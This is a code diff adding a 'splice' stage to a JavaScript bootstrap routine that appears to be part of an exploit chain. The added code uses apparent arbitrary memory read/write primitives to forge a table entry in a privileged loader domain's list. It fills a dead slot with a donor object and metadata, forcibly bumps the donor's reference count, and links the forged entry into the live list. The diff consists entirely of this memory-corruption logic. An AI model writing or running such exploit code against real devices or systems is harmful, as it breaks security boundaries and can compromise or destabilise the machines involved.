@@ -313,6 +313,78 @@ export async function runBootstrap(context, options = {}) {
                                 reoccupyError.message : reoccupyError));
                     }
                 }
+                if (busy === 16) {
+                    // Splice (v4): reseed the DEAD id in the LOADER's own
+                    // domain list by hand. The IS reoccupy (busy==12) seeds
+                    // the INSPECTION domain's list — domains own the entries
+                    // their own sessions create — but the wedged request
+                    // rides the loader's session and resolves against the
+                    // loader's list. Fill the dead slot (owner, object =
+                    // donor, metadata), then link it at the list tail.
+                    try {
+                        const lrow = context.bound.rows.find(
+                            r => r.domain === context.loaderRoot.domain);
+                        check(lrow, "the loader row is missing");
+                        const reqHead = await readFs(context, lrow.request, 0x18);
+                        const deadId = Number(readU32LE(reqHead, 0x14));
+                        check(deadId > 1 && deadId < context.layout.count,
+                            "implausible dead id " + deadId);
+                        const slot = context.layout.table + (deadId - 1) * 0x30;
+                        const donor = context.donorRow;
+                        check(donor && donor.object && donor.metadata,
+                            "the donor row is missing");
+                        const slotBytes = await readFs(context, slot, 0x30);
+                        const slotOwner = Number(readU64LE(slotBytes, 0x18));
+                        check(slotOwner === 0 || slotOwner === context.loaderRoot.domain,
+                            "the dead slot was reallocated (owner=" +
+                                hex(slotOwner) + ")");
+                        let refs = Number(readU32LE(
+                            await readFs(context, donor.object + 0x38n, 4), 0));
+                        await khLog("BS-splice dead id=" + deadId + " slot=" +
+                            hex(slot) + " owner=" + hex(slotOwner) +
+                            " donorRefs=" + refs);
+                        if (refs < 1) {
+                            await writeFs(context, donor.object + 0x38n,
+                                [1, 0, 0, 0]);
+                            await khLog("BS-splice bumped the donor refcount 0 -> 1");
+                        }
+                        // Fill the slot first (unlinked = inert): next =
+                        // sentinel, owner = loader domain, object + metadata
+                        // = the donor's.
+                        const sentinel = context.loaderRoot.domain + 0x20;
+                        const filled = new Array(0x30).fill(0);
+                        const put64 = (at, value) => {
+                            for (let b = 0; b < 8; b++)
+                                filled[at + b] = Number((BigInt(value) >>
+                                    BigInt(8 * b)) & 0xffn);
+                        };
+                        put64(0x00, sentinel);
+                        put64(0x18, context.loaderRoot.domain);
+                        put64(0x20, donor.object);
+                        put64(0x28, donor.metadata);
+                        await writeFs(context, slot, filled);
+                        // Link at the tail: walk to the last live entry and
+                        // swap its next from the sentinel to our slot.
+                        let at = Number(readU64LE(
+                            await readFs(context, sentinel, 8), 0));
+                        let tail = sentinel, hops = 0;
+                        while (at !== sentinel && hops < 128) {
+                            tail = at;
+                            at = Number(readU64LE(
+                                await readFs(context, at, 8), 0));
+                            hops++;
+                        }
+                        await compareWriteFs(context, tail,
+                            u64Bytes(BigInt(sentinel)), u64Bytes(BigInt(slot)));
+                        await khLog("BS-splice linked id " + deadId +
+                            " after " + (tail === sentinel ? "the sentinel" :
+                                "the tail") + " (" + hops + " hops)");
+                    } catch (spliceError) {
+                        await khLog("BS-splice failed: " +
+                            (spliceError && spliceError.message ?
+                                spliceError.message : spliceError));
+                    }
+                }
                 if (idle) break;  // drained by the unwedge — run the NRO now
                 if (busy % 10 === 1)
                     await khLog("BS-cmd0 busy x" + busy + " +" +
